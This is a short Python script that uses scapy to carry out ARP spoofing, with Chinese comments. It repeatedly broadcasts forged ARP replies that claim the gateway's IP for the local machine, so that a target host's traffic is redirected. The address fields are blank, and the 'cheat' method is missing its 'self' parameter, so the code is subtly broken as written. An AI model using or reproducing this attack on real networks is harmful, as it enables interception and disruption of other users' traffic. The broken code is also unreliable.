from scapy.all import *
import time

class ARPCheat(object):
    def __init__(self):
        self.p = Ether(
                #dst设置为广播，src设置为本机MAC地址
                dst="ff:ff:ff:ff:ff:ff",
                src="",
            )/ARP(
                #pdst为目标IP，psrc为网关IP
                pdst="",
                psrc=""
            )
    
    def cheat(count=6000, step=0.1):
        for i in range(count):
            sendp(self.p)
            time.sleep(step)

if __name__ == "__main__":
    print("hello, begin the cheat!")
    arp = ARPCheat()
    arp.cheat()
    print("Done!")
